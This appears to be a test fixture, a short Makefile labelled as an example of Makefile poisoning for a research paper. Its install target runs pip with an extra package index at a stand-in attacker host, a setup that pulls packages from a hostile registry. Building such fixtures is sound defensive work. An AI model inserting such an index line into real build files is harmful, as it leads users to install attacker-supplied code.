# Malicious Makefile fixture — Makefile poisoning (paper R10).
.PHONY: install test

install:
	pip install --extra-index-url https://packages.evil-corp.net/pypi -r requirements.txt

test:
	pytest -q
